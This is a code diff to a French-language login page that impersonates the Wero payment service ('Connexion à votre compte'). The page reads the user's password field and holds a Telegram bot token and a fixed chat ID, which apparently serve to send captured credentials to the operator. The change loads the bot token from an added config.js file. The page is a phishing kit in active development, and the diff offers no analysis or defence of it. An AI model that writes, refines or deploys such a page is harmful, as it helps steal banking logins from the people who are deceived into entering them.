@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
+    <script src="config.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Wero - Connexion à votre compte</title>
@@ -364,7 +365,7 @@
             const password = document.getElementById('password');
 
             // Configuration Telegram
-            const BOT_TOKEN = '[REDACTED]';
+            const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
             const CHAT_ID = '6078788670';
 
             function showToast(message, isError = false) {
